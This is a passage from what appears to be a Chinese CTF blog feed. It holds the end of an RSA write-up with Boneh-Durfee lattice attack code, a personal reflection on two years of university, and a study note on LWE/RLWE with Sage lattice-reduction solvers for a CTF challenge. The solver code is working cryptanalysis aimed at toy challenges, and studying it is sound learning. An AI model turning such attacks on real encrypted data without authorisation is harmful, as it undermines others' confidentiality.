class="number">1</span>, nn):  </span><br><span class="line">            <span class="comment"># for i and j, create the two polynomials  </span></span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)  </span><br><span class="line">            pol1 = pol2 = <span class="number">0</span>  </span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):  </span><br><span class="line">                pol1 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol1_idx, jj] / monomials[jj](UU, XX, YY)  </span><br><span class="line">                pol2 += monomials[jj](w * z + <span class="number">1</span>, w, z) * BB[pol2_idx, jj] / monomials[jj](UU, XX, YY)  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># resultant  </span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)  </span><br><span class="line">            rr = pol1.resultant(pol2)  </span><br><span class="line">  </span><br><span class="line">            <span class="comment"># are these good polynomials?  </span></span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == [<span class="number">1</span>]:  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="comment"># print(&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)  </span></span><br><span class="line">                found_polynomials = <span class="literal">True</span>  </span><br><span class="line">                <span class="keyword">break</span>        <span class="keyword">if</span> found_polynomials:  </span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:  </span><br><span class="line">        <span class="comment"># print(&quot;no independant vectors could be found. This should very rarely happen...&quot;)  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    rr = rr(q, q)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># solutions  </span></span><br><span class="line">    soly = rr.roots()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:  </span><br><span class="line">        <span class="comment"># print(&quot;Your prediction (delta) is too small&quot;)  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">  </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]  </span><br><span class="line">    ss = pol1(q, soly)  </span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">#  </span></span><br><span class="line">    <span class="keyword">return</span> solx, soly  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sol</span>(<span class="params">N, e, delta = <span class="number">.271</span></span>):  </span><br><span class="line">    m = <span class="number">8</span>  <span class="comment"># size of the lattice (bigger the better/slower)  </span></span><br><span class="line">    t = <span class="built_in">int</span>((<span class="number">1</span> - <span class="number">2</span> * delta) * m)  <span class="comment"># optimization from Herrmann and May  </span></span><br><span class="line">    X = <span class="number">2</span> * floor(N ^ delta)  <span class="comment"># this _might_ be too much  </span></span><br><span class="line">    Y = floor(N ^ (<span class="number">1</span> / <span class="number">2</span>))  <span class="comment"># correct if p, q are ~ same size  </span></span><br><span class="line">    P.&lt;x,y&gt; = PolynomialRing(ZZ)  </span><br><span class="line">    A = <span class="built_in">int</span>((N + <span class="number">1</span>) / <span class="number">2</span>)  </span><br><span class="line">    pol = <span class="number">1</span> + x * (A + y)  </span><br><span class="line">  </span><br><span class="line">    solx, soly = boneh_durfee(pol, e, m, t, X, Y)  </span><br><span class="line">  </span><br><span class="line">    d = <span class="built_in">int</span>(pol(solx, soly) / e)  </span><br><span class="line">    <span class="keyword">return</span> d  </span><br><span class="line">  </span><br><span class="line">d1 = sol(N2, e1, <span class="number">0.276</span>)  </span><br><span class="line">d2 = sol(N2, e2, <span class="number">0.276</span>)  </span><br><span class="line">  </span><br><span class="line">x = gcd(d1, d2)  </span><br><span class="line">  </span><br><span class="line">v_and_u = d1 // x  </span><br><span class="line">v_sub_u = d2 // x  </span><br><span class="line">v, u = (v_and_u + v_sub_u) // <span class="number">2</span>, (v_and_u - v_sub_u) // <span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line">hint = <span class="built_in">pow</span>(hint_ct, d2, N2)  </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(hint).decode())  </span><br><span class="line">  </span><br><span class="line">p_and_q = floor(sqrt(<span class="built_in">abs</span>(<span class="number">2</span> * N1 + sqrt((N1^<span class="number">2</span> + <span class="number">1</span>)^<span class="number">2</span> - (e3 * u) / v))))  </span><br><span class="line">p_sub_q = floor(sqrt(<span class="built_in">abs</span>(-<span class="number">2</span> * N1 + sqrt((N1^<span class="number">2</span> + <span class="number">1</span>)^<span class="number">2</span> - (e3 * u) / v))))  </span><br><span class="line">  </span><br><span class="line">p0 = (p_and_q + p_sub_q) // <span class="number">2</span>  </span><br><span class="line">  </span><br><span class="line">R.&lt;x&gt; = Zmod(N1)[]  </span><br><span class="line">f = x + p0  </span><br><span class="line">f = f.monic()  </span><br><span class="line">pad = f.small_roots(X = <span class="number">2</span>^<span class="number">16</span>, beta = <span class="number">0.4</span>)  </span><br><span class="line">  </span><br><span class="line">p = ZZ(p0 + pad[<span class="number">0</span>])  </span><br><span class="line">q = N1 // p  </span><br><span class="line">  </span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  </span><br><span class="line">d = inverse_mod(e3, phi)  </span><br><span class="line">  </span><br><span class="line">m = <span class="built_in">pow</span>(flag_ct, d, N1)  </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure></p><blockquote><p>这题的$e_1,e_2,e_3$的顺序在题目代码中实际上应该为$e_3,e_1,e_2$</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两年的回顾与探索</title>
      <link href="/2025/07/07/%E4%B8%A4%E5%B9%B4%E7%9A%84%E5%9B%9E%E9%A1%BE%E4%B8%8E%E6%8E%A2%E7%B4%A2/"/>
      <url>/2025/07/07/%E4%B8%A4%E5%B9%B4%E7%9A%84%E5%9B%9E%E9%A1%BE%E4%B8%8E%E6%8E%A2%E7%B4%A2/</url>
      
        <content type="html"><![CDATA[<p>转眼间，我的大学生活已经过了一半，有时与人提起高三的一些事情仍会聊得十分火热，仿佛高考出成绩、志愿填报还有大一入学才刚刚过去了不久，小时候总是觉得在学校的时间过得很慢，有时候大人们说”时间过得好快“的时候我还会觉得不解，直到我上了大学，真正拥有了相对自由的生活，并且可以学到自己真正喜欢的东西，才发现时间过得真的好快。感慨之余，我想通过文字总结一下我现已经过的两年大学生活。</p><p>大一刚入学的我，怀着从初中起对计算机科学与技术这一专业的憧憬踏入了大学的校门，那时的我对社团的选择有两大目标：加入学校的ACM战队或者学习游戏开发，但是如果看到了我的博客就会知道我现在学习的方向与我刚入学的目标其实完全不符，但是我同样很满意我现在的选择，甚至有点感谢大一时的我所做出的选择。当时在社团宣讲会之后，我去参加了ACM算法集训队的几次课程，在上大学之前我本身是有一些算法基础的，但是ACM集训队的课程与我理想中的集训课程差距甚远，或许是我接受能力比较弱，在听了三四节课之后，我决定放弃加入ACM集训队这个想法。与此同时，我加入了学校游戏社的开发部，但是其实因为自身专业课业较为繁重的原因，我并没有将太多心思放在这上面，特别是后面加入了学校的信息网络安全协会（后简称安全协会），慢慢地，我就淡离了开发部这个部门。</p><p>至于我为什么会加入安全协会，这其实挺阴差阳错的，在社团宣讲会的时候，我有印象安全协会是有进行过宣讲的，但是我当时一心只在ACM，并没有认真听安全协会的宣讲，以至于我对安全协会宣讲的印象似乎只有讲逆向工程的时候提到的”开挂“。而班里有几个同学想着加入安全协会，在某一天军训结束的时候，他们问我要不要一起去安全协会面试，而我当时甚至连协会的招新群都没有加，但是还是跟着去了，在路上他们把面试问卷发给我，我对意向方向中Web, Crypto, Pwn, Misc, Reverse五个名词十分的陌生，他们给我大致解释了一下五个方向分别是做什么的，想着高中的时候有学过初等数论和一些数论算法，这似乎对密码学的学习会比较有帮助，我就把意向方向锁定在了Crypto（密码学）这一方向，阴差阳错地我发现了我对密码学的兴趣（尽管很多人跟我说这个方向不好找工作），最终坚持到了现在。</p><p>大一上学期新生赛之后，我成为了安全协会的一名战队成员，也是在那之后，我开始参加国内外大大小小的各种CTF比赛，同时学习比赛中遇到的不会的知识点，其实回过头来看，我对密码学的学习从来都没有成过体系，往往都是遇到什么学什么的，而我那时还保留着高中不整理笔记的习惯（甚至连WP也不怎么写），就导致经常忘记自己学过什么东西，导致我学得略显吃力，又因为Crypto这个方向不像Web以及二进制（Reverse和Pwn）有这么多人学，所以很长一段时间以来我都没有参加过协会举行的分享会，也没多少相同方向的同学可以跟我一起交流学习。</p><p>闷头学习了一年之后，我进入了大二，大二上的课业还算比较轻松，因为选课，我整个大二上都是上四休三的状态，这也给了我更多时间去研究Crypto，也同时可以抽出时间来关注社团的招新工作以及新生赛的出题工作，我一直期待着协会中Crypto这个方向进入一些新鲜血液，这样也可以有更多机会可以学习交流——无论是新生还是我，但是因为一些原因，我们的新生赛被推迟到了我的大二下学期举办（对于新生而言是大一下学期），这导致新生在没有进入战队的时候并没有多少学习的动力以及打比赛的热情，从而使得新生的学习进度及其滞后，我个人认为这一决策失误之于社团发展而言是比较致命的，所以在下一届招新的时候会吸取教训，防止类似的事情再次发生。当然，关于招新的事情只是题外话，事实上，整个大二上学期我都在打各种新生赛（很多都是单刷的，排名看起来也不错），相对轻松的学业也让我开始接触其它方向，思虑再三，我决定在Crypto之外额外发展Pwn作为自己的副方向。在课程难度、课程数量等因素的加持下，我以一个看起来不错的成绩度过了大二上学期。</p><p>大二下学期我过得其实是比较痛苦的，原因主要是事情太多了，在这个学期我选了12门课，其中有九门课是要期末考的，而且难度都不低（例如运筹学，计算机网络和随机过程这三门），剩下的课自然也是要通过大作业来作为期末考核的，在平时，这些课不是要写实验报告就是要写一堆作业，这导致我很难抽出空余时间来学习Crypto以及Pwn相关知识，当然，时间像海绵里的水，挤一挤还是有的，虽说大二下学期不如大二上学期那样闲，也不如大一那样可以通过吃高中老本来解决期末，但我还是可以抽出时间来学习Crypto和Pwn的，只是时间没这么多罢了，这个学期我也重视起了整理笔记，为了防止自己因为学业而忘记先前学了什么，我把整理的一些笔记也上传到了我的博客上，感觉做了这些，我的学习才会走向正轨，这也许也是两年的大学学习生活给我带来的改变吧。</p><p>两年大学时光如白驹过隙，这两年我经历了很多事情，明白这短短的一篇文章是总结不完的，纵然现在的轨迹已经远远偏离了最初的设想，但这也是我自己所选择的，我所感兴趣的道路不是吗？课业最繁重的日子也过去了，以后我又要走向何方呢？这可能需要我和时间共同给出答案了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LWE</title>
      <link href="/2025/07/07/LWE/"/>
      <url>/2025/07/07/LWE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考资料：</p><ol type="1"><li><p><a href="https://eprint.iacr.org/2025/304">Lattice-based Cryptography: A survey on the security of the lattice-based NIST finalists</a></p></li><li><p><a href="https://link.springer.com/chapter/10.1007/978-3-319-89500-0_47">An Experimental Study of Kannan’s Embedding Technique for the Search LWE Problem | SpringerLink</a></p></li><li><p><a href="https://link.springer.com/article/10.1007/s11432-020-2958-9">A detailed analysis of primal attack and its variants | Science China Information Sciences</a></p></li></ol></blockquote><h2 id="lwe以及rlwe">LWE以及RLWE</h2><h3 id="lwe">LWE</h3><p>设<span class="math inline">\(n,m\)</span>以及<span class="math inline">\(q\)</span>为正整数（其中<span class="math inline">\(q\)</span>一般为质数），<span class="math inline">\(\chi\)</span>为一个<span class="math inline">\(\mathbb{Z}^{m}\)</span>上的概率分布，并设<span class="math inline">\(\pmb{s}\in(\mathbb{Z}/q\mathbb{Z})^n\)</span>是一条“秘密向量”，在<span class="math inline">\((\mathbb{Z}/q\mathbb{Z})^{m\times n}\)</span>上均匀随机选取矩阵<span class="math inline">\(\pmb{A}\)</span>，并在<span class="math inline">\(\mathbb{Z}^m\)</span>上选取一个分布服从<span class="math inline">\(\chi\)</span>的小向量<span class="math inline">\(\pmb{e}\)</span>作为噪声，计算： <span class="math display">\[\pmb{b}\equiv \pmb{A}\pmb{s}+\pmb{e}\pmod{q}\]</span> 并给出<span class="math inline">\((\pmb{A},\pmb{b})\)</span>，那么一般的LWE问题（一般称为搜索LWE，Search-LWE）即为给定<span class="math inline">\((\pmb{A},\pmb{b})\)</span>，还原出<span class="math inline">\(\pmb{s}\)</span>.</p><h3 id="环lwering-lwerlwe">环LWE（Ring-LWE，RLWE）</h3><p>设<span class="math inline">\(n\)</span>为一个大于等于<span class="math inline">\(1\)</span>的整数，<span class="math inline">\(q\)</span>为一质数，得到商环： <span class="math display">\[R=\frac{\mathbb{Z}[x]}{(x^n+1)},R_q=\frac{(\mathbb{Z}/q\mathbb{Z})[x]}{(x^n+1)}\]</span> 而<span class="math inline">\(\chi\)</span>为<span class="math inline">\(R\)</span>上的一个概率分布，选取随机秘密多项式<span class="math inline">\(s(x)\in R_q\)</span>以及随机多项式<span class="math inline">\(A(x)\in R_q\)</span>，并在<span class="math inline">\(R_q\)</span>上选取一个分布服从<span class="math inline">\(\chi\)</span>的多项式<span class="math inline">\(e\)</span>作为噪声，计算： <span class="math display">\[b(x)=A(x)s(x)+e(x)\]</span> 搜索RLWE问题即为给出若干组<span class="math inline">\((A_i(x),b_i(x))\)</span>，并从中恢复出<span class="math inline">\(s(x)\)</span>.</p><h2 id="通过格方法求解lwe及其变种">通过格方法求解LWE及其变种</h2><h3 id="lwe-1">LWE</h3><p>观察LWE的问题形式： <span class="math display">\[\pmb{b}\equiv \pmb{A}\pmb{s}+\pmb{e}\pmod{q}\]</span> 作为攻击者，我们要通过已知的<span class="math inline">\(\pmb{A},\pmb{b}\)</span>来恢复<span class="math inline">\(\pmb{s}\)</span>，且<span class="math inline">\(\pmb{e}\)</span>是一个未知的小向量，显然这是一个CVP问题，首先将原问题转换为： <span class="math display">\[\pmb{b}+q\pmb{k}=\pmb{A}\pmb{s}+\pmb{e}\]</span> 即： <span class="math display">\[q\pmb{k}-\pmb{A}\pmb{s}+\pmb{b}=\pmb{e}\]</span> 显然可以构造出如下格基： <span class="math display">\[\pmb{B} = \left(\begin{matrix}q\pmb{I}_m&amp;0&amp;0\\-\pmb{A}^T&amp;\pmb{I}_n&amp;0\\\pmb{b}&amp;0&amp;1\end{matrix}\right)\]</span> （实际上是利用Kannan嵌入法来将CVP转换为SVP求解）。对上述格基有如下关系： <span class="math display">\[(\pmb{k}^{T},\pmb{s}^{T},1)\pmb{B}=(\pmb{e}^{T},\pmb{s}^{T},1)\]</span> 通过格基规约算法（如LLL，BKZ等）即可得到短向量<span class="math inline">\((\pmb{e}^{T},\pmb{s}^{T},1)\)</span>，sage实现如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">q = ...</span><br><span class="line"></span><br><span class="line">L = block_matrix(ZZ, <span class="number">3</span>, <span class="number">3</span>, [[q, <span class="number">0</span>, <span class="number">0</span>], [-A.transpose(), <span class="number">1</span>, <span class="number">0</span>], [matrix(b), <span class="number">0</span>, <span class="number">1</span>]])</span><br><span class="line">res = L.LLL()</span><br><span class="line"></span><br><span class="line">v = res[<span class="number">0</span>]</span><br></pre></td></tr></table></figure> 测试发现，<span class="math inline">\(m\)</span>越大这种方法就越容易规约出目标向量，但是这种算法实际效果并不好，在参考资料2中提及了另外一种通过Kannan嵌入法求解LWE的方法，论文中提及算法如下：</p><figure><img src="https://cdn.jsdelivr.net/gh/TriodeLzx/blogimage/blog20250707202313550.png" alt="Pasted image 20250514090751" /><figcaption>Pasted image 20250514090751</figcaption></figure><p>其中HNF是Hermite Normal Form（埃尔米特标准型）的缩写，在之前的讨论中我们构造出的格基大小为<span class="math inline">\((n+m+1)\times(n+m+1)\)</span>，当<span class="math inline">\(n,m\)</span>都比较大的时候如果想要规约出目标向量是比较困难的，即使可以规约出目标向量也需要比较长时间，如果利用这种算法那么得到的格基大小将是<span class="math inline">\((m+1)\times(m+1)\)</span>，会相对较容易规约出目标向量，该目标向量会包含误差向量<span class="math inline">\(\pmb{e}\)</span>，该算法的sage实现如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = <span class="built_in">len</span>(b[<span class="number">0</span>])</span><br><span class="line">B = block_matrix(ZZ, <span class="number">2</span>, <span class="number">1</span>, [[A.transpose()], [q]])</span><br><span class="line">B_HNF = B.hermite_form(include_zero_rows=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">L = block_matrix(ZZ, <span class="number">2</span>, <span class="number">2</span>, [[B_HNF, <span class="number">0</span>], [matrix(b), <span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">res = L.LLL()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> res[-<span class="number">1</span>] == -<span class="number">1</span>:</span><br><span class="line">e = -vector(res[:-<span class="number">1</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">e = vector(res[:-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">cvp = vector(b) - e</span><br><span class="line"></span><br><span class="line">AA = matrix(Zmod(q), A)</span><br><span class="line">cvp = vector(Zmod(q), cvp)</span><br><span class="line"></span><br><span class="line">s = AA.solve_right(cvp)</span><br></pre></td></tr></table></figure><p>求解出的<code>s</code>即为我们所需要的。经测试发现，相较于之前讨论得到的算法这种算法求解LWE的效果更好.</p><h3 id="rlwe">RLWE</h3><p>在通过格来求解RLWE之前，需要了解商环中多项式乘法的矩阵表示（事实上商环中多项式乘法的矩阵表示在<a href="https://triodelzx.github.io/2025/04/09/NTRU/">NTRU | Triode Field</a>中有简单提及，在这里作详细说明）：</p><p>设一商环<span class="math inline">\(R=\mathbb{Z}[x]/f(x)\)</span>（其中<span class="math inline">\(f(x)\)</span>为<span class="math inline">\(\mathbb{Z}\)</span>中的一个首一<span class="math inline">\(n\)</span>次多项式），设<span class="math inline">\(f(x)\)</span>的系数分别为：<span class="math inline">\((a_0,a_1,\cdots,a_{n-1},1)\)</span>，那么很显然可以知道在该商环中有： <span class="math display">\[x^{n}=-(a_0+a_1x+\cdots+a_{n-1}x^{n-1})\]</span> 那么对于该商环中任意两多项式： <span class="math display">\[\begin{aligned}g(x)=b_0+b_1x+b_2x^2+\cdots+b_{n-1}x^{n-1}\\h(x)=c_0+c_1x+c_2x^2+\cdots+c_{n-1}x^{n-1}\end{aligned}\]</span> 设对<span class="math inline">\(\mathbb{Z}[x]\)</span>中有<span class="math inline">\(g(x)\cdot h(x)=k_0+k_1x+k_2x^2+\cdots+k_{2n-2}x^{2n-2}\)</span>，则有如下关系： <span class="math display">\[k_{i}=\sum_{s+t=i}b_sc_t\]</span> 那么可以得到上述多项式乘法的矩阵表示： <span class="math display">\[(b_0,b_1,b_2,\cdots,b_{n-1})\left(\begin{matrix}c_0&amp;c_1&amp;c_2&amp;\cdots&amp;c_{n-1}\\&amp;c_0&amp;c_1&amp;\cdots&amp;c_{n-2}&amp;c_{n-1}\\&amp;&amp;c_0&amp;\cdots&amp;c_{n-3}&amp;c_{n-2}&amp;c_{n-1}\\&amp;&amp;&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots\\&amp;&amp;&amp;&amp;c_{0}&amp;c_1&amp;c_2&amp;\cdots&amp;c_{n-1}\end{matrix}\right)=(k_0,k_1,k_2,\cdots,k_{2n-2})\]</span> 但是这只是对一般的多项式乘法生效的，对于商环<span class="math inline">\(R\)</span>中的多项式，则还需要对<span class="math inline">\((k_0,k_1,\cdots,k_{2n-2})\)</span>进行进一步处理，已知在<span class="math inline">\(R\)</span>中有： <span class="math display">\[x^{n}=-(a_0+a_1x+\cdots+a_{n-1}x^{n-1})\]</span> 所以对<span class="math inline">\(x^{n+1}\)</span>，有： <span class="math display">\[\begin{aligned}x^{n+1}&amp;=-(a_0x+a_1x^2+\cdots+a_{n-2}x^{n-1}+a_{n-1}x^{n})\\&amp;=-[a_0x+a_1x^2+\cdots+a_{n-2}x^{n-1}-a_{n-1}(a_0+a_1x+\cdots+a_{n-1}x^{n-1})]\end{aligned}\]</span> 展开就可以计算出各项系数，同理，有： <span class="math display">\[\begin{aligned}x^{n+2}&amp;=-(a_0x^2+a_1x^3+\cdots+a_{n-2}x^{n}+a_{n-1}x^{n+1})\\\end{aligned}\]</span> 将先前求出的<span class="math inline">\(x^{n+1}\)</span>与<span class="math inline">\(x^n\)</span>代进去即可求出<span class="math inline">\(x^{n+2}\)</span>，以此类推可以求出<span class="math inline">\(x^{n+3},x^{n+4},\cdots,x^{2n-2}\)</span>在<span class="math inline">\(R\)</span>中的表示，设在<span class="math inline">\(R\)</span>中<span class="math inline">\(g(x)\cdot h(x)=s_0+s_1x+s_2x^2+\cdots+s_{n-1}x^{n-1}\)</span>，有如下关系： <span class="math display">\[(k_0,k_1,k_2,\cdots,k_{2n-2})\left(\begin{matrix}1&amp;&amp;&amp;\\&amp;1&amp;&amp;\\&amp;&amp;\ddots\\&amp;&amp;&amp;1\\t_{n,0}&amp;t_{n,1}&amp;\cdots&amp;t_{n,n-1}\\t_{n+1,0}&amp;t_{n+1,1}&amp;\cdots&amp;t_{n+1,n-1}\\\vdots&amp;\vdots&amp;&amp;\vdots\\t_{2n-2,0}&amp;t_{2n-2,1}&amp;\cdots&amp;t_{2n-2,n-1}\end{matrix}\right)=(s_0,s_1,\cdots,s_{n-1})\]</span> 其中<span class="math inline">\(t_{n,0}\)</span>到<span class="math inline">\(t_{2n-2,n-1}\)</span>需要通过前面所说步骤进行计算，具体代码如下（参考了<a href="https://tangcuxiaojikuai.xyz/post/7a9f0ad2.html">2024-NSSCTF-Round-18-Basic-wp-crypto | 糖醋小鸡块的blog</a>中New Year Ring 3的代码）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">MR = Matrix(ZZ, <span class="number">2</span>*n-<span class="number">1</span>, n)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):  </span><br><span class="line">MR[i, i] = <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">2</span>*n-<span class="number">1</span>):  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i-n, n):  </span><br><span class="line">MR[i, j] = -a[j-(i-n)]  </span><br><span class="line">      </span><br><span class="line">tmp = vector(ZZ, n*[<span class="number">0</span>])  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i-n):  </span><br><span class="line">tmp2 = -a[n-<span class="number">1</span>-j] * vector(ZZ, MR[i-j-<span class="number">1</span>])  </span><br><span class="line">tmp += tmp2  </span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):  </span><br><span class="line">MR[i, j] += tmp[j]</span><br></pre></td></tr></table></figure> 获得两矩阵之后只需要通过如下计算就可以得到商环<span class="math inline">\(R\)</span>中多项式<span class="math inline">\(g(x)\cdot h(x)\)</span>的矩阵表示： <span class="math display">\[(b_0,b_1,b_2,\cdots,b_{n-1})\pmb{M}_L\pmb{M}_R=(s_0,s_1,\cdots,s_{n-1})\]</span> 其中： <span class="math display">\[\begin{aligned}&amp;\pmb{M}_L=\left(\begin{matrix}c_0&amp;c_1&amp;c_2&amp;\cdots&amp;c_{n-1}\\&amp;c_0&amp;c_1&amp;\cdots&amp;c_{n-2}&amp;c_{n-1}\\&amp;&amp;c_0&amp;\cdots&amp;c_{n-3}&amp;c_{n-2}&amp;c_{n-1}\\&amp;&amp;&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots\\&amp;&amp;&amp;&amp;c_{0}&amp;c_1&amp;c_2&amp;\cdots&amp;c_{n-1}\end{matrix}\right)\\&amp;\pmb{M}_R=\left(\begin{matrix}1&amp;&amp;&amp;\\&amp;1&amp;&amp;\\&amp;&amp;\ddots\\&amp;&amp;&amp;1\\t_{n,0}&amp;t_{n,1}&amp;\cdots&amp;t_{n,n-1}\\t_{n+1,0}&amp;t_{n+1,1}&amp;\cdots&amp;t_{n+1,n-1}\\\vdots&amp;\vdots&amp;&amp;\vdots\\t_{2n-2,0}&amp;t_{2n-2,1}&amp;\cdots&amp;t_{2n-2,n-1}\end{matrix}\right)\end{aligned}\]</span> 事实上在sage中可以通过商环多项式的<code>matrix()</code>方法来获得多项式<span class="math inline">\(g(x)\)</span>的乘法矩阵<span class="math inline">\(\pmb{M}=\pmb{M}_L\pmb{M}_R\)</span>，在获得这个矩阵之后，RLWE问题就可以转换为一般的LWE问题了： <span class="math display">\[b(x)=A(x)s(x)+e(x)\Leftrightarrow\pmb{b}=\pmb{s}\pmb{M}+\pmb{e}\]</span> 其中<span class="math inline">\(\pmb{}\)</span><span class="math inline">\(\pmb{b},\pmb{s},\pmb{e}\)</span>分别为<span class="math inline">\(b(x),s(x),e(x)\)</span>的系数（行）向量.</p><p>以<a href="https://www.nssctf.cn/problem/5112">NSSRound#18 Basic-New Year Ring2 | NSSCTF</a>为例：</p><p>加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line">p = getPrime(<span class="number">128</span>)  </span><br><span class="line">n = <span class="number">64</span>  </span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt; n  </span><br><span class="line">  </span><br><span class="line">PRp.&lt;x&gt; = PolynomialRing(Zmod(p))  </span><br><span class="line">f = x^n+<span class="number">2</span>*x^<span class="number">3</span>+<span class="number">0</span>*x^<span class="number">2</span>+<span class="number">2</span>*x+<span class="number">4</span>  <span class="comment">#welcome to 2024!  </span></span><br><span class="line">PR = PRp.quo(f)  </span><br><span class="line"><span class="keyword">assert</span> f.is_irreducible()  </span><br><span class="line">  </span><br><span class="line">A = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]  </span><br><span class="line">E = [randint(-<span class="number">4</span>, <span class="number">4</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]  </span><br><span class="line">S = [<span class="built_in">ord</span>(flag[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]  </span><br><span class="line">  </span><br><span class="line">B = PR(A)*PR(S)+PR(E)  </span><br><span class="line"><span class="built_in">print</span>(A)  </span><br><span class="line"><span class="built_in">print</span>(B.<span class="built_in">list</span>())  </span><br><span class="line"><span class="built_in">print</span>(p)  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#[...]  </span></span><br><span class="line"><span class="comment">#[...]  </span></span><br><span class="line"><span class="comment">#p = 171384865635734387982308861436753436427</span></span><br></pre></td></tr></table></figure><p>可以看到这很显然是RLWE问题，这里的环是： <span class="math display">\[R=\frac{\mathbb{Z}_p[x]}{x^{64}+2x^3+2x+4}\]</span> 可以通过如下代码构造格并进行规约获得目标向量并获得flag： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">A = [...]</span><br><span class="line">b = [...]</span><br><span class="line">p = <span class="number">171384865635734387982308861436753436427</span></span><br><span class="line">n = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x&gt; = ZZ[]</span><br><span class="line">f = x^n + <span class="number">2</span>*x^<span class="number">3</span> + <span class="number">2</span>*x + <span class="number">4</span></span><br><span class="line">R = PR.quotient(f)</span><br><span class="line"></span><br><span class="line">g = R(A)</span><br><span class="line">M = g.matrix()</span><br><span class="line"></span><br><span class="line">L = block_matrix(ZZ, <span class="number">3</span>, <span class="number">3</span>, [[p, <span class="number">0</span>, <span class="number">0</span>], [M, <span class="number">1</span>, <span class="number">0</span>], [matrix(b), <span class="number">0</span>, <span class="number">1</span>]])</span><br><span class="line">res = L.LLL()</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">2</span>*n):</span><br><span class="line"><span class="keyword">if</span> res[i, i] != <span class="number">0</span>:</span><br><span class="line">flag += <span class="built_in">chr</span>(<span class="built_in">abs</span>(res[<span class="number">0</span>, i]))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure> 测试发现对于任意一个方阵<span class="math inline">\(\pmb{M}&#39;\)</span>，<span class="math inline">\(\left(\begin{matrix}\pmb{M}&#39;\\q\pmb{I}\end{matrix}\right)\)</span>的HNF（去除所有0向量）都是单位矩阵，所以对于上述矩阵<span class="math inline">\(\pmb{M}\)</span>，我们并不能通过求矩阵<span class="math inline">\(\left(\begin{matrix}\pmb{M}\\q\pmb{I}\end{matrix}\right)\)</span>的HNF来减小格的规模，所以要优化求解效率的话只能借助效率更高的规约算法（例如<a href="https://github.com/keeganryan/flatter">flatter</a>）了。</p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>H&amp;NCTF 2025 部分题目WriteUP</title>
